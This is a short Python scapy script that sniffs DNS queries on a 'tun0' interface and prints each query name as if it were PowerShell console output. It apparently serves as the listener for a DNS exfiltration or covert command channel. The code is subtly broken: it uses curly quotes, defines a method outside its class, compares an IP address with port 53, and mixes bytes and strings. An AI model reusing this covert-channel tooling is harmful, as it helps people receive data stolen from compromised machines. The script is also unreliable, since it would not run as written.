
from scapy.all import *
from threading import Thread

class Sniffer(Thread):
 def __init__(self,interface=”tun0”):
  super().__init__()
  self.interface=interface



 def run(self):
  sniff(iface=self.interface,filter=”ip”,prn=self.print_packet)

def print_packet(self,packet):
  if packet.haslayer(DNS) and packet.dst==53:
   qname=packet.qd.name
   qtype=packet.qd.type
   if qtype==1:
     print(‘PS C:\> ’+qname[:-2].replace(“:”,” “).strip())
     print(‘\n’)
   

sniff=Sniffer()
sniff.start()
sniff.join()
